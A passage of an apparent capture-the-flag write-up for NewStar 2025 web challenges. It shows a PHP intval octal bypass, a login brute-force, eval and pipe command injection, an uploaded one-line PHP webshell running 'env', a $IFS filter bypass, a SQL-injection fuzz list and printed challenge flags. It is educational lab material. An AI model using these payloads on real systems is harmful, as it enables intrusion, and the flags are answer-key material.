class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;newstar2025&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$answer</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;newstar2025&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$answer</span>)!=<span class="number">47</span>&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$answer</span>,<span class="number">0</span>)==<span class="number">47</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你还未参透奥秘&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST newstar2025 intval( !&#x3D;47) 但是( &#x3D;47)</p><img src="afaa0778f99d6b473f13529e1703bfcc.png" alt="screen-capture.png"  /><p>八进制数 057 &#x3D; 5*8 + 7 &#x3D; 47 </p><h2 id="5-我真得控制你了"><a href="#5-我真得控制你了" class="headerlink" title="5.我真得控制你了"></a>5.我真得控制你了</h2><img src="221325a0ba22dc71088bf42e7d90b766.png" alt="screen-capture.png"  /><p>刷新和F12,拼手速</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#shieldOverlay&#x27;</span>).<span class="title function_">remove</span>();</span><br></pre></td></tr></table></figure> <img src="7c9d833c6b7a20134829a5ec452d2e28.png" alt="screen-capture.png"  /><img src="8e5e3b3610bd6ab237d0a2084de93a2f.png" alt="screen-capture.png"  /><p>用BP爆破 :</p><ul><li>admin </li><li>111111</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">轻轻松松绕</span><br><span class="line">真的很轻松</span><br><span class="line"></span><br><span class="line">源码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_dynamic_flag</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;ICQ_FLAG&quot;</span>) ?: <span class="string">&#x27;default_flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;恭喜掌握新姿势&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\d*\/~()\s]/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;老套路了，行不行啊&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\d\s]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;请输入有效的表达式&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$test</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;\$test = <span class="subst">$input</span>;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;表达式错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$test</span> == <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">generate_dynamic_flag</span>(<span class="variable">$flag_secret</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;success&#x27;&gt;拿下flag！&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: <span class="subst">&#123;$flag&#125;</span>&lt;/div&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;error&#x27;&gt;大哥哥泥把数字算错了: <span class="subst">$test</span> ≠ 2025&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="04aaac0bff70285ef6a0cb3ea570b301.png" alt="screen-capture.png"  /><h2 id="6-别笑，你也过不了第二关"><a href="#6-别笑，你也过不了第二关" class="headerlink" title="6.别笑，你也过不了第二关"></a>6.别笑，你也过不了第二关</h2><img src="05aefd0a89d4afa25e92be1579101066.png" alt="截图" style="zoom:50%;" /><img src="ad97ec4053986e5a1ddb15407236178b.png" alt="screen-capture.png"  /><p>第二關要1000000分???????? , 看看完成第一關會怎樣</p><p>抓包沒有發什麼 , 應該是JS code了</p><img src="13aea23ba1945003b598f4c5d260996a.png" alt="screen-capture.png"  /><p>試一試 score &#x3D; 1000000 ;</p><img src="a23455cd4a3ffc55ae4c28b8786db597.png" alt="screen-capture.png"  /><img src="8a1775109be806114dd6ee3160a6d8df.png" alt="screen-capture.png"  /><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="1-DD加速器"><a href="#1-DD加速器" class="headerlink" title="1.DD加速器"></a>1.DD加速器</h2><p>可以用管道符</p><img src="835b7a2b55e92bf312263c6c01f9a06f.png" alt="screen-capture.png"  /><img src="303981da871e616cc2eff5cd657d75c9.png" alt="screen-capture.png"  /><p>看看env , 想不到出現了flag</p><img src="188a101c4d4b8ec88ac5e733777dc2b9.png" alt="screen-capture.png"  /><p>flag{c45bacbe-370b-44cf-aeb7-37a3c7f07873}</p><h2 id="2-搞点哦润吉吃吃橘"><a href="#2-搞点哦润吉吃吃橘" class="headerlink" title="2.搞点哦润吉吃吃橘"></a>2.搞点哦润吉吃吃橘</h2><ul><li>考驗 JavaScript code能力</li></ul><img src="06a13719738926ca61e99cf9e679fade.png" alt="screen-capture.png"  /><img src="5a690493cdf7649c6cb2e1d6f0a2fc2d.png" alt="screen-capture.png"  /><img src="ccc0ad95a04756d58e622cb11ed28722.png" alt="screen-capture.png"  /><p>F12 在控制台寫腳本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> expressionElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;expressionText&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> tokenInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tokenInput&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> submitButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitBtn&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> expression = expressionElement.<span class="property">textContent</span>;</span><br><span class="line">    <span class="keyword">const</span> regex = <span class="regexp">/token = \(\d+ \* (\d+)\) \^ (0x[0-9a-fA-F]+|\d+)/</span>;</span><br><span class="line">    <span class="keyword">const</span> match = expression.<span class="title function_">match</span>(regex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (match &amp;&amp; match.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> multiplier = <span class="title class_">BigInt</span>(match[<span class="number">1</span>]); <span class="comment">// 直接转换为 BigInt</span></span><br><span class="line">        <span class="keyword">const</span> xor_value = <span class="title class_">BigInt</span>(match[<span class="number">2</span>]);  <span class="comment">// BigInt 支持直接解析十进制或十六进制字符串</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> currentTimestamp = <span class="title class_">BigInt</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算 token = (当前时间戳 * multiplier) ^ xor_value</span></span><br><span class="line">        <span class="keyword">const</span> token = (currentTimestamp * multiplier) ^ xor_value;</span><br><span class="line">        </span><br><span class="line">        tokenInput.<span class="property">value</span> = token.<span class="title function_">toString</span>(); <span class="comment">// BigInt 结果转为字符串填入</span></span><br><span class="line">        submitButton.<span class="title function_">click</span>();                <span class="comment">// 模拟点击提交按钮</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;自动化流程已执行。计算出的 token:&#x27;</span>, token.<span class="title function_">toString</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;请检查结果。&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><img src="10ab2a9b3a52725bd0212737b4ac2e2e.png" alt="screen-capture.png"  /><h2 id="3-白帽小K的故事（1）"><a href="#3-白帽小K的故事（1）" class="headerlink" title="3.白帽小K的故事（1）"></a>3.白帽小K的故事（1）</h2><img src="a24def4af9039cc05907adb91ef9f74a.png" alt="screen-capture.png"  /><img src="968f69408cec6cd3c808133ed6db371f.png" alt="screen-capture.png"  /><img src="9867d60a770064673ef8afec2748fdc0.png" alt="screen-capture.png"  /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO：</span></span><br><span class="line"><span class="comment">// 小岸同学到时候记得把这个函数删掉</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchload</span>(<span class="params">file</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/v1/onload&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span> &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="string">`file=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(file)&#125;</span>`</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> res.<span class="title function_">json</span>();</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;File content:&#x27;</span>, data.<span class="property">success</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error loading file:&#x27;</span>, data.<span class="property">error</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request failed&#x27;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetchList</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dirsearch一下 , </p><img src="2cf97f3fe905d6b20a101b500a120b14.png" alt="screen-capture.png"  /><p>應該有一個v1&#x2F;upload 用post 方法的 </p><p>Content-Type &#x3D; application&#x2F;x-www-form-urlencoded</p><p>file &#x3D; urlencode(easty.php)</p><img src="74edd55cd8bc89448ea0acc8c3260047.png" alt="screen-capture.png"  /><p>我剛剛上傳完另外一個文件 , 文件的字被urlencode了, run不了 , 我應該需要改一改一句話木馬</p><img src="bd6a97968077d6b535687d558fe8a48b.png" alt="screen-capture.png"  /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;env&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="7fc3dddba832a685e5f5c2650960bb36.png" alt="screen-capture.png"  /><p>flag{51fe6807-7862-41b3-a4dc-3cd271b02f53}</p><h2 id="4-真的是签到诶"><a href="#4-真的是签到诶" class="headerlink" title="4.真的是签到诶"></a>4.真的是签到诶</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cipher</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cipher&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">atbash</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$text</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$char</span>)) &#123;</span><br><span class="line">      <span class="variable">$is_upper</span> = <span class="title function_ invoke__">ctype_upper</span>(<span class="variable">$char</span>);</span><br><span class="line">      <span class="variable">$base</span> = <span class="variable">$is_upper</span> ? <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) : <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">      <span class="variable">$offset</span> = <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$char</span>)) - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">      <span class="variable">$new_char</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$base</span> + (<span class="number">25</span> - <span class="variable">$offset</span>));</span><br><span class="line">      <span class="variable">$result</span> .= <span class="variable">$new_char</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$result</span> .= <span class="variable">$char</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cipher</span>) &#123;</span><br><span class="line">  <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cipher</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">atbash</span>(<span class="variable">$cipher</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$encoded</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$encoded</span>);</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="variable">$encoded</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$question</span> = <span class="string">&quot;真的是签到吗？&quot;</span>;</span><br><span class="line"><span class="variable">$answer</span> = <span class="string">&quot;真的很签到诶！&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> =  <span class="variable">$question</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$answer</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> 真的是签到吗？</span><br><span class="line">真的很签到诶！</span><br><span class="line">真的是签到吗？</span><br><span class="line">真的很签到诶！</span><br><span class="line">真的是签到吗？</span><br><span class="line">真的很签到诶！</span><br><span class="line">真的是签到吗？</span><br><span class="line">真的很签到诶！</span><br><span class="line">真的是签到吗？</span><br><span class="line">真的很签到诶！</span><br></pre></td></tr></table></figure><img src="bdddc5e1d3262eb01c4db46f9439dada.png" alt="screen-capture.png"  /><p>处理流程如下：</p><ol><li>获取 POST 参数 cipher。</li><li>对 $cipher 进行 base64_decode 解码。</li><li>对解码后的字符串进行 atbash 字母替换（Atbash 密码）。</li><li>移除 atbash 结果中的所有空格 (str_replace(‘ ‘, ‘’, …))。</li><li>对移除空格后的字符串进行 str_rot13 字母替换（ROT13 密码）。</li><li>将最终结果字符串通过 @eval() 执行。</li></ol><img src="12228cbb4dbc6f3307d69851f2cc0ca0.png" alt="screen-capture.png"  /><br/><p>還是沒反應??</p><img src="f830254902a0fd4edfa1c9f3c9429270.png" alt="screen-capture.png"  /><p>有一個exit; 我們要在$encoded後面加一個die;</p><img src="3576f102506a27c694bfcebee2ff641c.png" alt="screen-capture.png"  /><img src="d03e62d59181a1e45e0dc144c4188ada.png" alt="screen-capture.png"  /><p>可以運行了 , 用$IFS    过滤一下 </p><img src="5e763e27706e612f30b1516febcfc14a.png" alt="screen-capture.png"  /><img src="1930751f76ba9c39db363536d12229eb.png" alt="screen-capture.png"  /><h2 id="5-小E的管理系统-未复刻"><a href="#5-小E的管理系统-未复刻" class="headerlink" title="5.小E的管理系统(未复刻)"></a>5.小E的管理系统(未复刻)</h2><img src="e8bb870428d9083e8e7cb7f50f1bb5d9.png" alt="e8bb870428d9083e8e7cb7f50f1bb5d9.png"  /><p>id是GET </p><p>sqlmap完全沒有用, 看來要手注了 ,???</p><img src="77479fa65f747a00423e9eafa77caa01.png" alt="77479fa65f747a00423e9eafa77caa01.png"  /><p>url編碼繞過 ,</p><img src="f1897f60ebf5715c2b0d7e28f2ce827e.png" alt="f1897f60ebf5715c2b0d7e28f2ce827e.png"  /><p>&#x2F;**&#x2F;被ban了</p><img src="3a53ac7b5466794d95109a0fd6667de7.png" alt="3a53ac7b5466794d95109a0fd6667de7.png"  /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br></pre></td></tr></table></figure><img src="34cb09a8a1cb644de56dae7972bef206.png" alt="34cb09a8a1cb644de56dae7972bef206.png"  /><p>列名都被ban了 ((((((</p><p>用了出題人的字典 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">length</span><br><span class="line">Length</span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">like</span><br><span class="line">LiKe</span><br><span class="line">select</span><br><span class="line">SeleCT</span><br><span class="line">sleep</span><br><span class="line">SLEEp</span><br><span class="line">database</span><br><span class="line">DATABASe</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">or</span><br><span class="line">oR</span><br><span class="line">as</span><br><span class="line">As</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limit</span><br><span class="line">LimIt</span><br><span class="line">left</span><br><span class="line">Left</span><br><span class="line">select</span><br><span class="line">SELECT</span><br><span class="line">insert</span><br><span class="line">insERT</span><br><span class="line">INSERT</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">=</span><br><span class="line">AND</span><br><span class="line">ANd</span><br><span class="line">BY</span><br><span class="line">By</span><br><span class="line">CAST</span><br><span 